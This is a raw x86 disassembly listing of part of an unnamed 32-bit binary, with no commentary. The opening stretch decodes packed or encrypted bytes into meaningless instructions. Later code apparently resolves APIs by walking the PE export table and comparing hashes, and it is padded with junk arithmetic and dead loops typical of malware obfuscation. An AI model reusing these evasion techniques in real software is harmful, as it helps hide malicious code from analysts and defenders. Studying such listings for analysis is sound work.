  41e041:	outs   dx,BYTE PTR ds:[esi]
  41e042:	jne    0x41e082
  41e044:	clc    
  41e045:	arpl   bp,si
  41e047:	xchg   edx,eax
  41e048:	je     0x41e00c
  41e04a:	xchg   ebx,eax
  41e04b:	push   0xffffffae
  41e04d:	repnz lgs edi,FWORD PTR [edi-0xe01063e]
  41e055:	cmp    esp,DWORD PTR [eax]
  41e057:	pop    eax
  41e058:	and    eax,0x4e708b4d
  41e05d:	aad    0x42
  41e05f:	test   BYTE PTR [eax],ch
  41e061:	js     0x41e089
  41e063:	call   0xffd23d0c
  41e068:	mov    DWORD PTR [ebp+0x38],ebp
  41e06b:	ror    edi,cl
  41e06d:	ds pusha 
  41e06f:	cwde   
  41e070:	setns  BYTE PTR [esi+ebx*2+0x29e17f67]
  41e078:	pop    ebp
  41e079:	xchg   ebx,eax
  41e07a:	mov    cl,0x8
  41e07c:	out    0x51,al
  41e07e:	add    dl,BYTE PTR [eax+0x3a58149b]
  41e084:	push   0x8cb737dc
  41e089:	call   FWORD PTR [ecx]
  41e08b:	mov    bl,0x7c
  41e08d:	ins    DWORD PTR es:[edi],dx
  41e08e:	sub    DWORD PTR [edi-0x4b],eax
  41e091:	xor    eax,0x84bfd974
  41e096:	pop    ss
  41e097:	mov    ebx,ecx
  41e099:	push   eax
  41e09a:	dec    esp
  41e09b:	es dec ebx
  41e09d:	and    al,ah
  41e09f:	int    0x6a
  41e0a1:	jne    0x41e103
  41e0a3:	adc    ecx,ebx
  41e0a5:	xor    BYTE PTR [eax+esi*8+0x2d],0xe2
  41e0aa:	les    ebx,FWORD PTR [ecx]
  41e0ac:	aad    0x5d
  41e0ae:	in     al,dx
  41e0af:	adc    BYTE PTR [edi+ebx*2+0xb1d991f],0xeb
  41e0b7:	xchg   ebx,eax
  41e0b8:	jbe    0x41e08a
  41e0ba:	inc    edi
  41e0bb:	mov    bh,0xe3
  41e0bd:	push   ss
  41e0be:	mov    ah,0x7d
  41e0c0:	(bad)  
  41e0c1:	out    0x2c,al
  41e0c3:	sbb    DWORD PTR [ebp+0x63],esp
  41e0c6:	or     DWORD PTR [ecx+0x44],ecx
  41e0c9:	xlat   BYTE PTR ds:[ebx]
  41e0ca:	mov    ecx,0xd212d509
  41e0cf:	and    bh,bh
  41e0d1:	aas    
  41e0d2:	mov    cl,0x7
  41e0d4:	rcr    BYTE PTR es:[ecx],1
  41e0d7:	jmp    0xc323b706
  41e0dc:	outs   dx,DWORD PTR ds:[esi]
  41e0dd:	aad    0x1
  41e0df:	test   al,0xbb
  41e0e1:	adc    al,0x2f
  41e0e3:	jp     0x41e0e1
  41e0e5:	outs   dx,BYTE PTR ds:[esi]
  41e0e6:	(bad)  
  41e0e7:	pop    ecx
  41e0e8:	cld    
  41e0e9:	lea    ebp,[eax+0x4d]
  41e0ec:	push   edi
  41e0ed:	in     al,dx
  41e0ee:	inc    esi
  41e0ef:	leave  
  41e0f0:	les    esi,FWORD PTR [edx+0x2218221f]
  41e0f6:	inc    esp
  41e0f7:	dec    ecx
  41e0f8:	add    DWORD PTR [esi-0x6aeb9534],esi
  41e0fe:	xchg   edx,eax
  41e0ff:	inc    edx
  41e100:	sahf   
  41e101:	adc    ch,bh
  41e103:	mov    BYTE PTR [edi-0x32],al
  41e106:	jno    0x41e184
  41e108:	xor    BYTE PTR [esi+0x4e],dl
  41e10b:	push   ebx
  41e10c:	dec    esi
  41e10d:	jp     0x41e130
  41e10f:	jbe    0x41e15c
  41e111:	pushf  
  41e112:	push   edi
  41e113:	(bad)  
  41e114:	and    ch,BYTE PTR [ecx]
  41e116:	(bad)  
  41e118:	mov    dl,BYTE PTR [eax*2-0x7079e96c]
  41e11f:	inc    eax
  41e120:	sbb    al,0x72
  41e122:	inc    ecx
  41e123:	add    ch,ch
  41e125:	sbb    DWORD PTR [ecx],ecx
  41e127:	shr    DWORD PTR ss:[edx+0x2792a312],0x21
  41e12f:	sub    DWORD PTR [eax+0x7e],eax
  41e132:	fcomp  QWORD PTR [esi-0x78]
  41e135:	(bad)  
  41e136:	(bad)  
  41e137:	(bad)  
  41e138:	xchg   edx,eax
  41e139:	popf   
  41e13a:	int    0xcf
  41e13c:	retf   
  41e13d:	push   ecx
  41e13e:	popf   
  41e13f:	punpckhdq mm3,QWORD PTR [edi+0x3]
  41e143:	inc    edx
  41e144:	out    dx,eax
  41e145:	or     BYTE PTR [edx+0x29cbc9c6],0x24
  41e14c:	inc    esp
  41e14d:	cmc    
  41e14e:	inc    edx
  41e14f:	pusha  
  41e150:	pop    ecx
  41e151:	mov    bh,0x5f
  41e153:	rcr    esi,cl
  41e155:	adc    al,0x8d
  41e157:	(bad)  
  41e159:	mov    ebp,0x755d58e6
  41e15e:	loope  0x41e1d6
  41e160:	fldcw  WORD PTR [edi-0x303a9dee]
  41e166:	scas   eax,DWORD PTR es:[edi]
  41e167:	dec    esp
  41e168:	jo     0x41e154
  41e16a:	ret    0xe125
  41e16d:	repnz adc al,0x80
  41e170:	lahf   
  41e171:	cmp    edi,0x37
  41e174:	cmp    esp,esi
  41e176:	push   eax
  41e177:	(bad)  
  41e178:	daa    
  41e179:	mov    eax,ds:0x7e01d060
  41e17e:	fistp  QWORD PTR [eax]
  41e180:	mov    al,0xea
  41e182:	adc    dh,BYTE PTR [edi]
  41e184:	xchg   esi,eax
  41e185:	sub    al,0x81
  41e187:	push   esi
  41e188:	outs   dx,BYTE PTR ds:[esi]
  41e189:	fwait
  41e18a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e18b:	and    esp,DWORD PTR [ebp-0x1f93ffac]
  41e191:	(bad)
  41e194:	out    0x8d,eax
  41e196:	je     0x41e1c5
  41e198:	dec    ebp
  41e199:	cwde   
  41e19a:	mov    esi,0x35f88f8f
  41e19f:	rcl    BYTE PTR [ebx+0x7],cl
  41e1a2:	stos   DWORD PTR es:[edi],eax
  41e1a3:	rcr    BYTE PTR [edx],0xa7
  41e1a6:	cmc    
  41e1a7:	cmp    edx,edi
  41e1a9:	jg     0x41e148
  41e1ab:	stos   DWORD PTR es:[edi],eax
  41e1ac:	adc    bl,BYTE PTR [eax]
  41e1ae:	or     eax,0x20e0f5ff
  41e1b3:	cmp    ax,0xdc3a
  41e1b7:	mov    bh,0xc1
  41e1b9:	into   
  41e1ba:	sbb    ch,BYTE PTR [edi+eiz*4]
  41e1bd:	sbb    al,0x4d
  41e1bf:	jmp    0x7a35:0x856acb9
  41e1c6:	pop    ds
  41e1c7:	sub    eax,edi
  41e1c9:	out    0xc5,al
  41e1cb:	xor    DWORD PTR [esi+0x4],edi
  41e1ce:	fsubr  DWORD PTR [ebp-0x4e4bf105]
  41e1d4:	push   es
  41e1d5:	mov    ch,0xb
  41e1d7:	(bad)  
  41e1d8:	cld    
  41e1d9:	mov    ebp,0x465b6849
  41e1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1df:	jmp    0x41e1b4
  41e1e1:	cmp    eax,0x45f2a969
  41e1e6:	inc    ecx
  41e1e7:	js     0x41e1df
  41e1e9:	cmc    
  41e1ea:	dec    edx
  41e1eb:	pop    ss
  41e1ec:	cwde   
  41e1ed:	adc    eax,eax
  41e1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f0:	inc    eax
  41e1f1:	shl    BYTE PTR [ecx+0x35],0x81
  41e1f5:	stos   BYTE PTR es:[edi],al
  41e1f6:	retf   0xc11e
  41e1f9:	fild   QWORD PTR [edi+esi*1-0x51]
  41e1fd:	call   DWORD PTR [esi-0x5072d5fe]
  41e203:	sub    BYTE PTR [edx-0x4aa9ad30],0xbd
  41e20a:	push   ecx
  41e20b:	or     al,0x6e
  41e20d:	push   es
  41e20e:	mov    dh,0x48
  41e210:	repz scas eax,DWORD PTR es:[edi]
  41e212:	and    BYTE PTR [edx-0x53314f4e],dh
  41e218:	mov    ah,0x43
  41e21a:	popf   
  41e21b:	leave  
  41e21c:	fucomip st,st(2)
  41e21e:	(bad)  
  41e21f:	adc    BYTE PTR [edx+esi*8-0x55],bl
  41e223:	dec    eax
  41e224:	test   BYTE PTR [edx+eax*1],cl
  41e227:	cmp    dh,dl
  41e229:	dec    esi
  41e22a:	pop    edx
  41e22b:	mov    ebx,0xc88e9016
  41e230:	mov    DWORD PTR [edx],ebx
  41e232:	inc    ebp
  41e233:	pushf  
  41e234:	xor    DWORD PTR [ebp*8+0x7987f34],ebp
  41e23b:	test   BYTE PTR [esi+0x2b],0x89
  41e23f:	stc    
  41e240:	inc    eax
  41e241:	sub    DWORD PTR [ecx-0x5d71bae2],esp
  41e247:	dec    esi
  41e248:	rcl    eax,0x2b
  41e24b:	pop    ss
  41e24c:	call   0x8b1b0c5c
  41e251:	int    0x65
  41e253:	push   es
  41e254:	out    0x62,eax
  41e256:	sub    DWORD PTR [edi+0x55],0xffffffa6
  41e25a:	in     al,dx
  41e25b:	sbb    BYTE PTR [edx-0x5545cd02],bh
  41e261:	pop    ebp
  41e262:	sub    DWORD PTR [esi+0x64],edi
  41e265:	loope  0x41e1ee
  41e267:	call   FWORD PTR [edx+0x5bd31d5c]
  41e26d:	outs   dx,DWORD PTR ds:[esi]
  41e26e:	xchg   ebx,eax
  41e26f:	adc    bl,BYTE PTR [eax+0x675d7a2d]
  41e275:	iretw  
  41e277:	dec    ebp
  41e278:	cmp    esi,DWORD PTR [edi+eiz*8+0x0]
  41e27c:	ds inc esp
  41e27e:	test   al,0xc2
  41e280:	pop    edx
  41e281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e282:	ja     0x41e24c
  41e284:	pusha  
  41e285:	jo     0x41e23e
  41e287:	jle    0x41e21a
  41e289:	loop   0x41e2b5
  41e28b:	sbb    ch,dh
  41e28d:	xor    BYTE PTR [esi+0x1b7e0909],0x26
  41e294:	and    ch,BYTE PTR [edi-0x48f0f77b]
  41e29a:	int    0xb8
  41e29c:	je     0x41e246
  41e29e:	mov    ebx,gs
  41e2a0:	test   dl,al
  41e2a2:	push   esp
  41e2a3:	mov    esi,0xeb69d67b
  41e2a8:	fistp  QWORD PTR [ecx-0x452e5bc]
  41e2ae:	lea    ecx,[ebx+0x71cf1938]
  41e2b4:	pop    edi
  41e2b5:	imul   ecx,DWORD PTR [edx-0x15],0x17
  41e2b9:	nop
  41e2ba:	xchg   edx,eax
  41e2bb:	xchg   BYTE PTR [edi+0x7143e516],ch
  41e2c1:	dec    ebx
  41e2c2:	xor    dl,ah
  41e2c4:	test   BYTE PTR ss:[ecx],bl
  41e2c7:	lods   eax,DWORD PTR ds:[esi]
  41e2c8:	inc    esi
  41e2c9:	lock popa 
  41e2cb:	outs   dx,DWORD PTR ds:[esi]
  41e2cc:	in     al,0x61
  41e2ce:	(bad)  
  41e2cf:	icebp  
  41e2d0:	pop    edi
  41e2d1:	xchg   ebp,eax
  41e2d2:	(bad)  
  41e2d3:	push   esi
  41e2d4:	pop    ebx
  41e2d5:	les    ebx,FWORD PTR [ebx+0x6d]
  41e2d8:	imul   ebp,DWORD PTR [eax-0x4cb900d5],0x46
  41e2df:	adc    bh,BYTE PTR [ebx]
  41e2e1:	push   edx
  41e2e2:	fdivr  QWORD PTR [edx+0x73]
  41e2e5:	lods   al,BYTE PTR ds:[esi]
  41e2e6:	pop    edi
  41e2e7:	jecxz  0x41e2ed
  41e2e9:	popf   
  41e2ea:	leave  
  41e2eb:	xor    DWORD PTR [ecx+esi*8+0x70],edi
  41e2ef:	ror    DWORD PTR [esi+edi*4-0x2b0842eb],0xcb
  41e2f7:	sub    DWORD PTR [esi+edi*1+0x5e],esi
  41e2fb:	pop    eax
  41e2fc:	pusha  
  41e2fd:	ds je  0x41e28f
  41e300:	lods   al,BYTE PTR ds:[esi]
  41e301:	pop    ebp
  41e302:	jle    0x41e2a0
  41e304:	into   
  41e305:	lods   eax,DWORD PTR ds:[esi]
  41e306:	push   es
  41e307:	and    BYTE PTR [esi],dl
  41e309:	mov    esi,0x5039549e
  41e30e:	ds cmp al,0x2d
  41e311:	sbb    bh,bl
  41e313:	sbb    bh,bh
  41e315:	fdivr  DWORD PTR [esi+0x3f8bfd54]
  41e31b:	mov    ebx,DWORD PTR [eax+0x3c]
  41e31e:	lea    edi,[ebx+edi*8+0x78]
  41e322:	mov    edi,DWORD PTR [edi+eax*1]
  41e325:	mov    DWORD PTR [ebp-0x18],edi
  41e328:	mov    edi,DWORD PTR [ebp+0x8]
  41e32b:	xor    edi,ecx
  41e32d:	add    edi,edx
  41e32f:	mov    DWORD PTR [ebp-0x1c],edi
  41e332:	mov    edi,DWORD PTR [ebp+0x8]
  41e335:	xor    edi,ecx
  41e337:	mov    ecx,DWORD PTR [ebp-0x18]
  41e33a:	add    edi,edx
  41e33c:	cmp    ecx,edi
  41e33e:	je     0x41e380
  41e344:	mov    ecx,DWORD PTR [ebp-0x18]
  41e347:	add    ecx,eax
  41e349:	mov    DWORD PTR [ebp-0x1c],ecx
  41e34c:	mov    ecx,DWORD PTR [ebp-0x30]
  41e34f:	mov    edx,DWORD PTR [ebp-0x2c]
  41e352:	mov    edx,0xa145
  41e357:	xor    cx,dx
  41e35a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e35d:	mov    edx,DWORD PTR [edx+0xc]
  41e360:	add    cx,si
  41e363:	cmp    WORD PTR [eax+edx*1],cx
  41e367:	jne    0x41e380
  41e36d:	mov    ecx,DWORD PTR ds:0x428365
  41e373:	mov    ecx,DWORD PTR [ecx+0x198]
  41e379:	mov    DWORD PTR [ecx],eax
  41e37b:	jmp    0x41e3db
  41e380:	push   DWORD PTR [ebp+0x1c]
  41e383:	push   DWORD PTR [ebp+0x18]
  41e386:	jmp    0x41e3ca
  41e38b:	mov    eax,DWORD PTR [ebp+0x18]
  41e38e:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e391:	cmp    eax,0x70941f92
  41e396:	jne    0x41e3af
  41e39c:	cmp    ecx,ebx
  41e39e:	jne    0x41e3af
  41e3a4:	push   ebx
  41e3a5:	push   0x70941f9c
  41e3aa:	jmp    0x41e3ca
  41e3af:	mov    eax,DWORD PTR [ebp+0x18]
  41e3b2:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e3b5:	cmp    eax,0x70941f9c
  41e3ba:	jne    0x41e3db
  41e3c0:	cmp    ecx,ebx
  41e3c2:	jne    0x41e3db
  41e3c8:	push   ebx
  41e3c9:	push   edi
  41e3ca:	push   DWORD PTR [ebp+0x14]
  41e3cd:	push   DWORD PTR [ebp+0x10]
  41e3d0:	push   DWORD PTR [ebp+0xc]
  41e3d3:	push   DWORD PTR [ebp+0x8]
  41e3d6:	call   0x417181
  41e3db:	pop    edi
  41e3dc:	pop    esi
  41e3dd:	pop    ebx
  41e3de:	leave  
  41e3df:	ret    0x18
  41e3e2:	push   ebp
  41e3e3:	mov    ebp,esp
  41e3e5:	and    esp,0xfffffff8
  41e3e8:	sub    esp,0xcc
  41e3ee:	mov    al,ds:0x42848a
  41e3f3:	push   ebx
  41e3f4:	mov    DWORD PTR ds:0x428e39,0x550e
  41e3fe:	push   esi
  41e3ff:	mov    DWORD PTR ds:0x428e29,0x154d
  41e409:	push   edi
  41e40a:	mov    DWORD PTR ds:0x428e49,0x193
  41e414:	mov    BYTE PTR [esp+0xd6],0x0
  41e41c:	cmp    al,BYTE PTR ds:0x428497
  41e422:	je     0x41e439
  41e428:	xor    eax,eax
  41e42a:	mov    DWORD PTR ds:0x428e81,0x6e70
  41e434:	jmp    0x41f510
  41e439:	mov    al,ds:0x4284a3
  41e43e:	mov    DWORD PTR ds:0x428ecd,0xf87
  41e448:	cmp    al,BYTE PTR ds:0x4284b4
  41e44e:	jne    0x41e428
  41e454:	mov    edi,DWORD PTR ds:0x42ca5c
  41e45a:	push   0x4284bd
  41e45f:	adc    DWORD PTR ds:0x428e35,0x428eb9
  41e469:	push   0x4284c9
  41e46e:	call   edi
  41e470:	sbb    DWORD PTR ds:0x428e45,0x428eb5
  41e47a:	test   eax,eax
  41e47c:	mov    DWORD PTR ds:0x428e85,0x5858
  41e486:	je     0x41e428
  41e48c:	push   0x1
  41e48e:	and    DWORD PTR ds:0x428e85,0x768a
  41e498:	push   0x9765765
  41e49d:	call   DWORD PTR ds:0x42ca34
  41e4a3:	and    DWORD PTR ds:0x428e49,0x546c
  41e4ad:	push   0x4284d9
  41e4b2:	sub    DWORD PTR ds:0x428e55,0x3ef4
  41e4bc:	lea    eax,[esp+0x5c]
  41e4c0:	adc    DWORD PTR ds:0x428ecd,0x2de
  41e4ca:	push   eax
  41e4cb:	xor    DWORD PTR ds:0x428e65,0x1e99
  41e4d5:	call   DWORD PTR ds:0x42ca44
  41e4db:	add    DWORD PTR ds:0x428e9d,edi
  41e4e1:	mov    DWORD PTR [esp+0x30],0x0
  41e4e9:	or     edx,esi
  41e4eb:	mov    ecx,0xf89c85b9
  41e4f0:	adc    edx,edx
  41e4f2:	mov    DWORD PTR [esp+0x28],ecx
  41e4f6:	mov    DWORD PTR [esp+0xc],0xf89c85b8
  41e4fe:	dec    esi
  41e4ff:	lea    eax,[esp+0x3c]
  41e503:	and    DWORD PTR ds:0x428ea9,0x0
  41e50d:	xor    edx,edx
  41e50f:	add    edx,DWORD PTR ds:0x428ea9
  41e515:	inc    edx
  41e516:	mov    DWORD PTR ds:0x428ea9,edx
  41e51c:	cmp    DWORD PTR ds:0x428ea9,0x21
  41e523:	jle    0x41e54e
  41e529:	jmp    0x41e541
  41e52e:	push   0x428124
  41e533:	push   DWORD PTR [ebp-0x14]
  41e536:	push   0x1e1e
  41e53b:	call   DWORD PTR ds:0x42ca60
  41e541:	cmp    DWORD PTR ds:0x428ea9,0x17
  41e548:	jb     0x41e50d
  41e54e:	mov    DWORD PTR [esp+0x30],eax
  41e552:	adc    esi,DWORD PTR ds:0x428ead
  41e558:	lea    eax,[esp+0x38]
  41e55c:	and    DWORD PTR ds:0x428e89,0x0
  41e566:	jmp    0x41e578
  41e56b:	mov    ebx,DWORD PTR ds:0x428e89
  41e571:	inc    ebx
  41e572:	mov    DWORD PTR ds:0x428e89,ebx
  41e578:	cmp    DWORD PTR ds:0x428e89,0x11
  41e57f:	jae    0x41e5ca
  41e585:	cmp    DWORD PTR ds:0x428e89,0x5
  41e58c:	jb     0x41e5ca
  41e592:	jmp    0x41e5ab
  41e597:	push   0x42814e
  41e59c:	push   DWORD PTR [ebp-0x24]
  41e59f:	push   DWORD PTR [ebp-0x10]
  41e5a2:	push   DWORD PTR [ebp-0x18]
  41e5a5:	call   DWORD PTR ds:0x42ca64
  41e5ab:	cmp    DWORD PTR ds:0x428e89,0x4
  41e5b2:	jne    0x41e5c5
  41e5b8:	mov    ebx,DWORD PTR ds:0x428e89
  41e5be:	inc    ebx
  41e5bf:	mov    DWORD PTR ds:0x428e89,ebx
  41e5c5:	jmp    0x41e56b
  41e5ca:	mov    DWORD PTR [esp+0x18],eax
  41e5ce:	xor    esi,esi
  41e5d0:	or     esi,DWORD PTR ds:0x428eb9
  41e5d6:	or     DWORD PTR ds:0x428e25,esi
  41e5dc:	mov    eax,ds:0x428365
  41e5e1:	mov    eax,DWORD PTR [eax+0x1c8]
  41e5e7:	mov    eax,DWORD PTR [eax]
  41e5e9:	mov    DWORD PTR ds:0x428e9d,0x1c
  41e5f3:	cmp    DWORD PTR ds:0x428e9d,0x0
  41e5fa:	je     0x41e64a
  41e600:	cmp    DWORD PTR ds:0x428e9d,0x3
  41e607:	jl     0x41e64a
  41e60d:	jmp    0x41e61e
  41e612:	push   DWORD PTR [ebp-0x24]
  41e615:	push   DWORD PTR [ebp-0x28]
  41e618:	call   DWORD PTR ds:0x42ca18
  41e61e:	cmp    DWORD PTR ds:0x428e9d,0x4
  41e625:	jne    0x41e638
  41e62b:	mov    ebx,DWORD PTR ds:0x428e9d
  41e631:	dec    ebx
  41e632:	mov    DWORD PTR ds:0x428e9d,ebx
  41e638:	mov    ebx,DWORD PTR ds:0x428e9d
  41e63e:	dec    ebx
  41e63f:	mov    DWORD PTR ds:0x428e9d,ebx
  41e645:	jmp    0x41e5f3
  41e64a:	mov    edx,DWORD PTR [esp+0x18]
  41e64e:	adc    DWORD PTR ds:0x428ec9,edi
  41e654:	mov    esi,0x75108b1
  41e659:	sub    ebx,0x34f9
  41e65f:	xor    eax,esi
  41e661:	add    DWORD PTR ds:0x428e39,0x7d93
  41e66b:	mov    ebx,0x3272f8
  41e670:	or     DWORD PTR ds:0x428e6d,0x428e29
  41e67a:	add    eax,ebx
  41e67c:	mov    DWORD PTR ds:0x428e35,0x4692
  41e686:	mov    DWORD PTR [edx],eax
  41e688:	not    eax
  41e68a:	mov    eax,ds:0x428ce5
  41e68f:	cmp    eax,0x455dedfa
  41e694:	jne    0x41e6fe
  41e69a:	neg    eax
  41e69c:	mov    eax,DWORD PTR [esp+0x28]
  41e6a0:	mov    edx,DWORD PTR ds:0x428365
  41e6a6:	xor    DWORD PTR ds:0x428e91,0x428ebd
  41e6b0:	mov    edx,DWORD PTR [edx+0x198]
  41e6b6:	xor    eax,esi
  41e6b8:	add    DWORD PTR ds:0x428e9d,0x1078
  41e6c2:	add    eax,ebx
  41e6c4:	add    DWORD PTR ds:0x428e89,0x4c2a
  41e6ce:	mov    DWORD PTR [edx],eax
  41e6d0:	mov    eax,DWORD PTR [esp+0x28]
  41e6d4:	xor    eax,esi
  41e6d6:	add    eax,ebx
  41e6d8:	mov    ds:0x428ce5,eax
  41e6dd:	mov    eax,DWORD PTR [esp+0x28]
  41e6e1:	sub    DWORD PTR ds:0x428e41,0x428ec9
  41e6eb:	xor    eax,esi
  41e6ed:	add    eax,ebx
  41e6ef:	or     DWORD PTR ds:0x428e45,0x428e35
  41e6f9:	mov    ds:0x42845d,eax
  41e6fe:	and    DWORD PTR ds:0x428e85,0x0
  41e708:	jmp    0x41e718
  41e70d:	mov    eax,ds:0x428e85
  41e712:	inc    eax
  41e713:	mov    ds:0x428e85,eax
  41e718:	cmp    DWORD PTR ds:0x428e85,0x15
  41e71f:	jae    0x41e74a
  41e725:	cmp    DWORD PTR ds:0x428e85,0x18
  41e72c:	jg     0x41e74a
  41e732:	jmp    0x41e745
  41e737:	push   0x467c
  41e73c:	push   DWORD PTR [ebp-0x14]
  41e73f:	call   DWORD PTR ds:0x42ca1c
  41e745:	jmp    0x41e70d
  41e74a:	mov    eax,ds:0x428365
  41e74f:	mov    eax,DWORD PTR [eax+0x18c]
  41e755:	mov    eax,DWORD PTR [eax]
  41e757:	sbb    DWORD PTR ds:0x428eb1,0x2dbb
  41e761:	mov    DWORD PTR [esp+0x40],eax
  41e765:	movzx  eax,WORD PTR ds:0x428ea5
  41e76c:	sub    DWORD PTR ds:0x428e6d,eax
  41e772:	mov    eax,0xf89c85bd
  41e777:	mov    DWORD PTR [esp+0x10],eax
  41e77b:	mov    DWORD PTR [esp+0x10],eax
  41e77f:	mov    DWORD PTR [esp+0x10],eax
  41e783:	add    DWORD PTR ds:0x428e65,0x428e6d
  41e78d:	mov    DWORD PTR [esp+0x10],ecx
  41e791:	sub    DWORD PTR ds:0x428e5d,0x428e6d
  41e79b:	mov    DWORD PTR [esp+0x18],eax
  41e79f:	mov    DWORD PTR [esp+0x18],0xf89c85a1
  41e7a7:	mov    eax,ds:0x428ec1
  41e7ac:	add    DWORD PTR ds:0x428e89,eax
  41e7b2:	mov    eax,DWORD PTR [esp+0x28]
  41e7b6:	xor    eax,esi
  41e7b8:	add    eax,ebx
  41e7ba:	jmp    0x41e98b
  41e7bf:	mov    al,ds:0x4284de
  41e7c4:	cmp    al,BYTE PTR ds:0x4284eb
  41e7ca:	jne    0x41e428
  41e7d0:	mov    al,ds:0x4284f7
  41e7d5:	cmp    al,BYTE PTR ds:0x428508
  41e7db:	mov    DWORD PTR ds:0x428ea1,0x1959
  41e7e5:	jne    0x41e428
  41e7eb:	push   0x428511
  41e7f0:	xor    DWORD PTR ds:0x428e5d,0x2e26
  41e7fa:	push   0x42851d
  41e7ff:	call   edi
  41e801:	or     DWORD PTR ds:0x428e59,0x428eb9
  41e80b:	test   eax,eax
  41e80d:	mov    DWORD PTR ds:0x428e99,0x6eaa
  41e817:	je     0x41e428
  41e81d:	mov    al,ds:0x42852e
  41e822:	cmp    al,BYTE PTR ds:0x42853b
  41e828:	mov    DWORD PTR ds:0x428e4d,0x38ed
  41e832:	jne    0x41e428
  41e838:	mov    DWORD PTR ds:0x428e65,0x1c9c
  41e842:	mov    al,ds:0x428547
  41e847:	mov    DWORD PTR ds:0x428ecd,0x75a8
  41e851:	cmp    al,BYTE PTR ds:0x428558
  41e857:	mov    DWORD PTR ds:0x428e71,0x3bcf
  41e861:	jne    0x41e428
  41e867:	adc    DWORD PTR ds:0x428ead,0x428ebd
  41e871:	push   0x428561
  41e876:	inc    DWORD PTR ds:0x428ec1
  41e87c:	push   0x42856d
  41e881:	call   edi
  41e883:	test   eax,eax
  41e885:	mov    DWORD PTR ds:0x428e31,0x5531
  41e88f:	je     0x41e428
  41e895:	sub    eax,0x55e1
  41e89a:	mov    eax,DWORD PTR [esp+0xc]
  41e89e:	sbb    DWORD PTR ds:0x428ea1,0x6f3f
  41e8a8:	mov    ecx,DWORD PTR [esp+0x18]
  41e8ac:	add    DWORD PTR ds:0x428e8d,0x428e31
  41e8b6:	xor    eax,esi
  41e8b8:	adc    DWORD PTR ds:0x428e79,0x1de7
  41e8c2:	lea    eax,[eax+ecx*1+0x3272f8]
  41e8c9:	push   eax
  41e8ca:	mov    eax,DWORD PTR [esp+0x14]
  41e8ce:	and    DWORD PTR ds:0x428e61,0x6940
  41e8d8:	xor    eax,esi
  41e8da:	xor    DWORD PTR ds:0x428e85,0x2762
  41e8e4:	lea    eax,[ebp+eax*1+0x327300]
  41e8eb:	push   eax
  41e8ec:	xor    eax,0x37bf
  41e8f1:	mov    eax,ds:0x428365
  41e8f6:	push   DWORD PTR [eax+0x1bc]
  41e8fc:	xor    DWORD PTR ds:0x428e49,0x22e4
  41e906:	call   0x41f519
  41e90b:	xor    edx,edx
  41e90d:	xor    edx,DWORD PTR ds:0x428eed
  41e913:	mov    ecx,DWORD PTR ds:0x428efd
  41e919:	sub    ecx,edx
  41e91b:	sub    edx,DWORD PTR [edx+ecx*1]
  41e91e:	mov    eax,DWORD PTR [esp+0xc]
  41e922:	and    DWORD PTR ds:0x428ebd,0x0
  41e92c:	jmp    0x41e940
  41e931:	xor    edx,edx
  41e933:	add    edx,DWORD PTR ds:0x428ebd
  41e939:	inc    edx
  41e93a:	mov    DWORD PTR ds:0x428ebd,edx
  41e940:	cmp    DWORD PTR ds:0x428ebd,0x12
  41e947:	jae    0x41e972
  41e94d:	cmp    DWORD PTR ds:0x428ebd,0x1a
  41e954:	jbe    0x41e972
  41e95a:	jmp    0x41e96d
  41e95f:	push   0x4280ab
  41e964:	push   DWORD PTR [ebp-0x24]
  41e967:	call   DWORD PTR ds:0x42ca20
  41e96d:	jmp    0x41e931
  41e972:	mov    ecx,DWORD PTR [esp+0x18]
  41e976:	add    DWORD PTR ds:0x428ebd,edi
  41e97c:	xor    eax,esi
  41e97e:	xor    edx,DWORD PTR ds:0x428eb1
  41e984:	lea    eax,[ecx+eax*1+0x3272f8]
  41e98b:	and    DWORD PTR ds:0x428e29,0x0
  41e995:	jmp    0x41e9a9
  41e99a:	xor    ecx,ecx
  41e99c:	add    ecx,DWORD PTR ds:0x428e29
  41e9a2:	inc    ecx
  41e9a3:	mov    DWORD PTR ds:0x428e29,ecx
  41e9a9:	cmp    DWORD PTR ds:0x428e29,0x1b
  41e9b0:	jae    0x41e9f5
  41e9b6:	cmp    DWORD PTR ds:0x428e29,0x4
  41e9bd:	jbe    0x41e9f5
  41e9c3:	jmp    0x41e9d6
  41e9c8:	push   0x428092
  41e9cd:	push   DWORD PTR [ebp-0x1c]
  41e9d0:	call   DWORD PTR ds:0x42ca24
  41e9d6:	cmp    DWORD PTR ds:0x428e29,0x3
  41e9dd:	jne    0x41e9f0
  41e9e3:	mov    ecx,DWORD PTR ds:0x428e29
  41e9e9:	inc    ecx
  41e9ea:	mov    DWORD PTR ds:0x428e29,ecx
  41e9f0:	jmp    0x41e99a
  41e9f5:	mov    ecx,DWORD PTR [esp+0xc]
  41e9f9:	mov    edx,DWORD PTR [esp+0xc]
  41e9fd:	and    DWORD PTR ds:0x428e81,0x27c9
  41ea07:	xor    edx,esi
  41ea09:	xor    ecx,esi
  41ea0b:	add    ecx,edx
  41ea0d:	and    DWORD PTR ds:0x428eb9,0x0
  41ea17:	mov    edx,DWORD PTR ds:0x428eb9
  41ea1d:	inc    edx
  41ea1e:	mov    DWORD PTR ds:0x428eb9,edx
  41ea24:	cmp    DWORD PTR ds:0x428eb9,0x23
  41ea2b:	jle    0x41ea4e
  41ea31:	jmp    0x41ea41
  41ea36:	push   0x3c70
  41ea3b:	call   DWORD PTR ds:0x42ca28
  41ea41:	cmp    DWORD PTR ds:0x428eb9,0x1b
  41ea48:	jb     0x41ea17
  41ea4e:	mov    edx,DWORD PTR [esp+0xc]
  41ea52:	adc    DWORD PTR ds:0x428ec9,0x428ecd
  41ea5c:	xor    edx,esi
  41ea5e:	mov    DWORD PTR ds:0x428e85,0x69c
  41ea68:	lea    ecx,[ecx+edx*1+0x9758e8]
  41ea6f:	mov    DWORD PTR ds:0x428ec1,0x5f48
  41ea79:	mov    DWORD PTR [esp+0x18],eax
  41ea7d:	mov    DWORD PTR ds:0x428e41,0x5aa0
  41ea87:	cmp    eax,ecx
  41ea89:	mov    DWORD PTR ds:0x428e69,0x3a73
  41ea93:	jbe    0x41e7bf
  41ea99:	and    ecx,DWORD PTR ds:0x428ed1
  41ea9f:	mov    eax,DWORD PTR [ebp+0xc]
